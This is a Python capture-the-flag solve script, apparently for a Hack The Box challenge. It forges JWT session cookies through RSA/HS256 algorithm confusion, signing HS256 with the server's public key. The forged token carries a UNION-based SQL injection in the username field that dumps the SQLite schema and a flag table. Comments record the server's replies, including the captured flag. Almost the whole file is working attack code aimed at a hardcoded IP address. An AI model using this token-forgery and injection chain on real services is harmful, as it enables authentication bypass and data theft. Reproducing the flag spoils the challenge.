import requests
import base64
import hmac
import hashlib
import re
import json

url = "http://188.166.168.204:32236/"


def encode(dictionary):
    return base64.urlsafe_b64encode(json.dumps(dictionary, separators=(",", ":")).encode()).decode('UTF-8').strip("=")


def genSig(key, data):
    return base64.urlsafe_b64encode(hmac.new(key.encode(), data.encode(), hashlib.sha256).digest()).decode('UTF-8').strip("=")


def jwtOut(token):
    resData = requests.get(url, cookies={"session": token}, verify=False)
    print(resData.status_code)
    print(resData.content)


def checkPubKeyExploit(paylB64, pubKey="rsa.pub"):
    key = open(pubKey).read()
    newHead = {}
    newHead["alg"] = "HS256"
    newHead["typ"] = "JWT"
    newTok = encode(newHead) + "." + paylB64
    newSig = genSig(key, newTok)
    return newTok, newSig


# query = r"SELECT null,sqlite_version(),null"  # works, nice
# query = r"SELECT null,tbl_name,null FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%"
#  Welcome flag_storage<br>\n
query = r"SELECT null,sql,null FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%'"
query += r" AND name ='flag_storage'"
"""
Welcome CREATE TABLE &quot;flag_storage&quot; 
(\n\t&quot;id&quot;\tINTEGER PRIMARY KEY AUTOINCREMENT,\n\t&quot;top_secret_flaag&quot;\tTEXT\n)<br>\n           
"""
query = r"SELECT null,top_secret_flaag,null FROM flag_storage"
#       Welcome HTB{d0n7_3xp053_y0ur_publ1ck3y}<br>
x = """{
  "username": "some' and 1=2 UNION """ + query + """--",
  "iat": 1615760627
}"""

newTok, newSig = checkPubKeyExploit(encode(x))
jwtOut(newTok + "." + newSig)
